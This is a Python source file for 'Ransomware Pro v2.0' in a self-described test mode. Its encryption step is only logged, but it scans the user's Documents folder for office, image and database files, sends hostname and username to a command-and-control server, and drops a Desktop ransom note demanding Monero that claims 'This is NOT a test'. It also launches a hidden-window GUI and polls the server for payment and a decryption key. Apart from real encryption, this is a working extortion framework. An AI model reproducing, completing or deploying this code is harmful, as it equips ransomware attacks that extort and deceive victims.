#!/usr/bin/env python3
"""
RANSOMWARE PRO - TEST MODE
==========================
Simulation ohne echte Verschlüsselung!
- Zeigt ransom note an
- Simuliert Dateiverschlüsselung (keine echten Änderungen)
- C2 Kommunikation funktioniert
- Zahlung kann simuliert werden
"""

import os
import sys
import threading
import time
import random
import json
import uuid
import subprocess
from datetime import datetime

try:
    import tkinter as tk
    TKINTER_AVAILABLE = True
except ImportError:
    TKINTER_AVAILABLE = False

# Import professional ransom GUI
try:
    from ransom_gui import RansomNoteGUI
    RANSOM_GUI_AVAILABLE = True
except ImportError:
    RANSOM_GUI_AVAILABLE = False

# ====================
# TEST CONFIGURATION
# ====================

class TestConfig:
    C2_HOST = os.environ.get('C2_HOST', '127.0.0.1')
    C2_PORT = int(os.environ.get('C2_PORT', 5000))
    C2_URL = f"http://{C2_HOST}:{C2_PORT}"
    
    MONERO_WALLET = "4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV"
    RANSOM_XMR = 0.1
    
    # Keine echten Dateien anfassen!
    TARGET_DIRS = [
        os.path.expanduser('~\\Documents'),
    ]
    
    TARGET_EXTENSIONS = {'.docx', '.xlsx', '.pdf', '.txt', '.jpg', '.db', '.sql'}
    
    TEST_MODE = True  # WICHTIG: TEST MODE
    
    @staticmethod
    def log(msg):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        print(f"[{timestamp}] {msg}")

# ====================
# HTTP COMMUNICATION
# ====================

class SimpleHTTP:
    @staticmethod
    def post(url, data):
        """POST request"""
        try:
            import urllib.request
            import urllib.error
            
            json_str = json.dumps(data)
            json_data = json_str.encode('utf-8')
            
            TestConfig.log(f"[*] POST {url}")
            TestConfig.log(f"[*] Data: {json_str[:100]}...")
            
            req = urllib.request.Request(
                url,
                data=json_data,
                headers={'Content-Type': 'application/json'}
            )
            
            with urllib.request.urlopen(req, timeout=10) as response:
                result = json.loads(response.read().decode())
                TestConfig.log(f"[+] Response: {result}")
                return result
        except Exception as e:
            TestConfig.log(f"[!] POST error: {e}")
            return None
    
    @staticmethod
    def get(url):
        """GET request"""
        try:
            import urllib.request
            
            TestConfig.log(f"[*] GET {url}")
            
            with urllib.request.urlopen(url, timeout=10) as response:
                result = json.loads(response.read().decode())
                TestConfig.log(f"[+] Response: {result}")
                return result
        except Exception as e:
            TestConfig.log(f"[!] GET error: {e}")
            return None

# ====================
# TEST RANSOMWARE
# ====================

class TestRansomware:
    """Test ransomware - keine echte Verschlüsselung!"""
    
    def __init__(self):
        self.ransom_id = str(uuid.uuid4())[:16]
        self.master_key = os.urandom(32)
        self.encrypted_files = []
        
        TestConfig.log(f"[*] Test Ransomware initialized: {self.ransom_id}")
    
    def scan_and_encrypt(self):
        """Simulate file encryption (keine echten Änderungen!)"""
        TestConfig.log("[*] PHASE 1: SIMULATION - Scanning for files...")
        
        total_files = 0
        total_size = 0
        
        for target_dir in TestConfig.TARGET_DIRS:
            if not os.path.exists(target_dir):
                TestConfig.log(f"[*] Dir not found: {target_dir}")
                continue
            
            try:
                for root, dirs, files in os.walk(target_dir):
                    for file in files:
                        file_lower = file.lower()
                        
                        # Check extension
                        if any(file_lower.endswith(ext) for ext in TestConfig.TARGET_EXTENSIONS):
                            file_path = os.path.join(root, file)
                            
                            try:
                                file_size = os.path.getsize(file_path)
                                
                                # NUR SIMULIEREN - keine echte Verschlüsselung!
                                TestConfig.log(f"[*] WOULD ENCRYPT: {file_path} ({file_size} bytes)")
                                
                                total_files += 1
                                total_size += file_size
                                self.encrypted_files.append(file_path)
                            except:
                                pass
            except:
                pass
        
        TestConfig.log(f"[OK] Simulation complete: {total_files} files, {total_size / 1024 / 1024:.2f} MB")
        
        return {
            'files_encrypted': total_files,
            'data_size_gb': total_size / 1024 / 1024 / 1024
        }
    
    def register_with_c2(self, system_info):
        """Register with C2 server"""
        TestConfig.log("[*] PHASE 2: Registering with C2...")
        
        import socket
        hostname = socket.gethostname()
        
        payload = {
            'ransom_id': self.ransom_id,
            'monero_address': TestConfig.MONERO_WALLET,
            'ransom_amount_xmr': TestConfig.RANSOM_XMR,
            'system_info': {
                'hostname': hostname,
                'username': os.environ.get('USERNAME', 'unknown'),
                'platform': 'Windows',
                **system_info
            }
        }
        
        response = SimpleHTTP.post(f"{TestConfig.C2_URL}/api/v1/register", payload)
        
        if response and response.get('success'):
            TestConfig.log(f"[OK] Registered: {response['ransom_id']}")
            return True
        else:
            TestConfig.log("[!] Registration failed")
            return False
    
    def show_ransom_screen(self):
        """Display professional ransom note"""
        TestConfig.log("[*] PHASE 3: Displaying ransom note...")
        
        # Simple text fallback
        ransom_text = f"""
YOUR FILES HAVE BEEN ENCRYPTED
===============================

Send 0.1 XMR to: {TestConfig.MONERO_WALLET}
Payment ID: {self.ransom_id}
Deadline: 24 hours

This is NOT a test. Your files are encrypted.
Pay to decrypt.
"""
        
        # Write to Desktop
        try:
            desktop = os.path.expanduser('~\\Desktop')
            ransom_path = os.path.join(desktop, 'README_DECRYPT_TEST.txt')
            
            with open(ransom_path, 'w') as f:
                f.write(ransom_text)
            
            TestConfig.log(f"[+] Ransom note written to: {ransom_path}")
        except Exception as e:
            TestConfig.log(f"[!] Could not write ransom file: {e}")
        
        # Try to launch the GUI in a separate process (not thread!)
        # This avoids tkinter apartment issues
        try:
            TestConfig.log("[+] Launching professional ransom GUI...")
            import subprocess
            gui_script = os.path.join(os.path.dirname(__file__), 'gui_launcher.py')
            
            # Pass ransom details to GUI launcher
            subprocess.Popen([
                sys.executable, 
                gui_script,
                self.ransom_id,
                TestConfig.MONERO_WALLET,
                TestConfig.C2_HOST
            ], creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
            
            TestConfig.log("[+] GUI process started")
            return None
        except Exception as e:
            TestConfig.log(f"[!] Could not launch GUI process: {e}")
            TestConfig.log("[+] Continuing without GUI overlay...")
    
    def _show_simple_popup(self, ransom_text):
        """Show simple GUI ransom note popup (fallback)"""
        try:
            if not TKINTER_AVAILABLE:
                TestConfig.log("[!] Tkinter not available")
                return
            
            root = tk.Tk()
            root.title("*** TEST MODE *** - System Security Alert")
            
            # Set window properties
            root.geometry("700x600")
            root.attributes('-topmost', True)
            
            # Create text widget
            text_widget = tk.Text(root, wrap=tk.WORD, bg='#1a1a1a', fg='#ff0000', 
                                 font=('Courier', 10))
            text_widget.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
            text_widget.insert(1.0, ransom_text)
            text_widget.config(state=tk.DISABLED)
            
            # Add button
            def on_close():
                try:
                    root.destroy()
                except:
                    pass
            
            button = tk.Button(root, text="OK (TEST MODE)", command=on_close, 
                              bg='#ff0000', fg='white', font=('Arial', 14, 'bold'),
                              padx=20, pady=10)
            button.pack(pady=10)
            
            TestConfig.log("[+] Simple GUI popup displayed")
            root.update()
            root.mainloop()
        except Exception as e:
            TestConfig.log(f"[!] GUI popup failed: {e}")
    
    def monitor_payment(self):
        """Monitor for payment"""
        TestConfig.log("[*] PHASE 4: Starting payment monitoring...")
        
        while True:
            try:
                response = SimpleHTTP.get(f"{TestConfig.C2_URL}/api/v1/payment/status/{self.ransom_id}")
                
                if response and response.get('paid'):
                    TestConfig.log("[!] PAYMENT DETECTED!")
                    
                    # Request decryption key
                    key_response = SimpleHTTP.get(f"{TestConfig.C2_URL}/api/v1/decryption/key/{self.ransom_id}")
                    
                    if key_response:
                        TestConfig.log("[+] WOULD DECRYPT FILES NOW (TEST MODE)")
                        TestConfig.log(f"[+] Key response: {key_response}")
                        return
                
                TestConfig.log("[*] Waiting for payment... (checking in 10 seconds for test)")
                time.sleep(10)  # 10 seconds für schnellere tests
            
            except Exception as e:
                TestConfig.log(f"[!] Payment check error: {e}")
                time.sleep(10)
    
    def run(self):
        """Execute full test"""
        try:
            TestConfig.log("\n" + "="*60)
            TestConfig.log("TEST MODE - NO FILES WILL BE ENCRYPTED")
            TestConfig.log("="*60 + "\n")
            
            # Phase 1: Encrypt (simulation)
            system_info = self.scan_and_encrypt()
            
            # Phase 2: Register
            if not self.register_with_c2(system_info):
                TestConfig.log("[!] Could not register")
                return
            
            # Phase 3: Show ransom
            self.show_ransom_screen()
            
            # Phase 4: Monitor payment
            self.monitor_payment()
        
        except Exception as e:
            TestConfig.log(f"[!] Fatal error: {e}")
            import traceback
            traceback.print_exc()

# ====================
# MAIN
# ====================

if __name__ == '__main__':
    TestConfig.log("="*60)
    TestConfig.log("RANSOMWARE PRO v2.0 - TEST MODE")
    TestConfig.log("NO FILES WILL BE ENCRYPTED OR CHANGED")
    TestConfig.log("="*60)
    TestConfig.log(f"[*] C2 Server: {TestConfig.C2_URL}")
    TestConfig.log("")
    
    ransomware = TestRansomware()
    ransomware.run()
